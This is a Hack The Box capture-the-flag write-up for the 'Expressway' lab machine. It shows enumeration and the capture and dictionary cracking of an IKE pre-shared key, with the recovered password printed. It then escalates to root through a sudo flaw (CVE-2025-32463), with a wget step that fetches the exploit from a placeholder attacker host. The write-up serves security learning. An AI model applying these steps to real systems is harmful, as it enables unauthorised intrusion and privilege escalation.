---
clayout: ctf
title: Expressway
date: 2025-09-22
image: /ctf/hack-the-box/machines/expressway/info-card.png
type: Hack The Box

ctf:
    - name: Expressway
      link: https://app.hackthebox.com/machines/736
      thumbnail: /ctf/hack-the-box/machines/expressway/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/736
          thumbnail: /ctf/hack-the-box/machines/expressway/pwned.png
---

## Machine Overview

We found an IKE responder that leaked an Aggressive-Mode PSK hash, cracked the PSK offline, used the recovered secret to access the machine as `ike`, and then escalated to root via an unpatched `sudo` binary (CVE-2025-32463).

## Enumeration

### Nmap

We start with a service/version scan to identify exposed services.

```bash
nmap -sC -sV -oN nmap.txt 10.10.11.87
```

**Scan output:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
```

Only SSH is exposed on the host.

Scanning for UDP services we can see that there is a UDP service running on port 500.

```bash
nmap -sU -A -oN udp-nmap.txt 10.10.11.87
```

**UDP scan output:**

```bash
PORT    STATE SERVICE
500/udp open  isakmp
```

This service is running IKE, so we can use `ike-scan` to scan for IKE responders.

### IKE discovery & PSK capture

Using `ike-scan` in aggressive mode we can force the responder to return data that can be used to generate an offline cracking target.

```bash
ike-scan --aggressive --pskcrack=pskhash.txt 10.10.11.87
```

**Output:**

```bash
10.10.11.87  Aggressive Mode Handshake returned HDR=(CKY-R=...) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) ... Hash(20 bytes)
```

The `--pskcrack=pskhash.txt` option writes the necessary parameters to `pskhash.txt` for offline cracking.

### Cracking the PSK

We used `psk-crack` to run a dictionary attack against the captured hash.

```bash
psk-crack -w /usr/share/wordlists/rockyou.txt pskhash.txt
```

**Output:**

```bash
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash a3f3d0eb14adbe273eba65e9ff68105a71227380
```

> Recovered PSK: `freakingrockstarontheroad`

## Gaining access (SSH)

With the recovered secret, we can log in via SSH as the `ike` user.

```bash
ssh ike@10.10.11.87
```

**Output:**

```bash
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

> [!IMPORTANT] User flag
> `/home/ike/user.txt`

## Privilege escalation

### Find SUID / sudo binary

We searched for SUID binaries:

```bash
find / -type f -perm -u=s 2>/dev/null
```

**Output:** from all the output only two binaries are interesting:

```bash
# ... more output
/usr/local/bin/sudo
/usr/bin/sudo
# ... more output
```

We got two `sudo` binaries, by checking the version we can see that the `/usr/local/bin/sudo` is the vulnerable version.

```bash
/usr/local/bin/sudo --version
```

**Output:**

```bash
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

This version is vulnerable to a known local privilege escalation (CVE-2025-32463). Using this [PoC](https://github.com/KaiHT-Ladiant/CVE-2025-32463) we can exploit the vulnerability.

### Exploitation

We hosted the exploit script on our attacker machine and retrieved it from the target, then executed it to obtain a root shell.

> [!TIP]
> Use `python3 -m http.server 1337` to host the exploit script on our attacker machine. And `wget http://<YOUR_IP>:1337/cve-2025-32463.sh` to retrieve it from the target.

```bash
chmod +x cve-2025-32463.sh
./cve-2025-32463.sh
```

**Exploit output:**

```bash
[*] Exploiting CVE-2025-32463...
[*] Attempting privilege escalation...
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```

> [!IMPORTANT] Root flag
> `/root/root.txt`
